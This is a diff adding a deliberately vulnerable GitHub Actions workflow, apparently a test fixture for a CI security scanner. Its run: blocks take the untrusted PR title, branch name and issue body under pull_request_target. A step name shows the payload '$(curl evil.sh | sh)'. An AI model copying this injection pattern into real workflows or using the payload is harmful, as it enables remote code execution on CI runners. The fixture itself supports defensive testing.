@@ -1,0 +1,26 @@
+# Fixture for P14.10 — template injection in run: blocks.
+# `github.event.pull_request.title` and `github.head_ref` flow directly into
+# bash, both on an untrusted-event trigger (also fires P14.1).
+
+name: PR Welcome
+
+on:
+  pull_request_target:
+    types: [opened]
+
+permissions:
+  pull-requests: write
+
+jobs:
+  welcome:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Greet (RCE if PR title is `$(curl evil.sh | sh)`)
+        run: |
+          echo "Hello! Reviewing PR titled: ${{ github.event.pull_request.title }}"
+          echo "Branch is ${{ github.head_ref }}"
+
+      - name: Comment on issue body
+        run: |
+          BODY="${{ github.event.issue.body }}"
+          echo "Body length: ${#BODY}"
